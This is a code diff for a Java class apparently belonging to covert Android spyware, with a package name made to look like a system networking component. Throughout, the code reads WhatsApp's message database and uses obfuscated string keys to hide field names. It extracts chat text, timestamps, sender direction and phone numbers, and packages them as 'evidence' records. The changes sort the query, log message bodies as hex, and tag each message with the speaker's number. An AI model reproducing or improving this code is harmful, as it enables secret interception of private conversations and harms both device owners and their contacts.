@@ -46,6 +46,7 @@ import com.android.networking.listener.ListenerProcess;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DateTime;
+import com.android.networking.util.StringUtils;
 import com.android.networking.util.WChar;
 
 public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
@@ -60,7 +61,6 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			this.timestamp=date;
 			this.from_me=from_me;
 		}
-
 	}
 
 	private static final String TAG = "ModuleChat";
@@ -365,7 +365,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_7"), Messages.getString("f_b"), Messages.getString("f_c") };
 		
 		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation AND key_remote_jid>$lastReadIndex
-		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
+		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, Messages.getString("f_4"));
 		
 		ArrayList<CMessage> messages = new ArrayList<CMessage>();
 		int lastRead = lastReadIndex;
@@ -375,10 +375,13 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			Long timestamp = cursor.getLong(3); // f_b
 			boolean from_me = cursor.getInt(4) == 1; // f_c
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + data);
+				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + data );
 			}
 			lastRead = Math.max(index, lastRead);
 			if(data != null){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (fetchMessages): " + StringUtils.byteArrayToHexString(data.getBytes()));
+				}
 				messages.add(new CMessage(data, new Date(timestamp), from_me));
 
 			}
@@ -405,14 +408,16 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			// APPLICATION
 			items.add(WChar.getBytes(Messages.getString("f_8"), true));
 			// TOPIC
+			String peer = conversation.replaceAll(Messages.getString("f_9"),"");
+			//items.add(WChar.getBytes( peer + "," + myPhoneNumber, true));
 			items.add(WChar.getBytes("", true));
 			// f.9=@s.whatsapp.net	
-			// PEERS
-			String peer = conversation.replaceAll(Messages.getString("f_9"),"");
-			String peers = message.from_me? myPhoneNumber +","+ peer : peer + "," + myPhoneNumber; 
+			// PEERS			
+			String peers = message.from_me? myPhoneNumber + " " + peer : peer + " " + myPhoneNumber; 
 			items.add(WChar.getBytes(conversation.replaceAll(Messages.getString("f_9"), ""), true));
 			// CONTENT
-			items.add(WChar.getBytes(message.data, true));
+			String talker = message.from_me? myPhoneNumber : peer;
+			items.add(WChar.getBytes(talker + ": " + message.data, true));
 			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
 		}
 
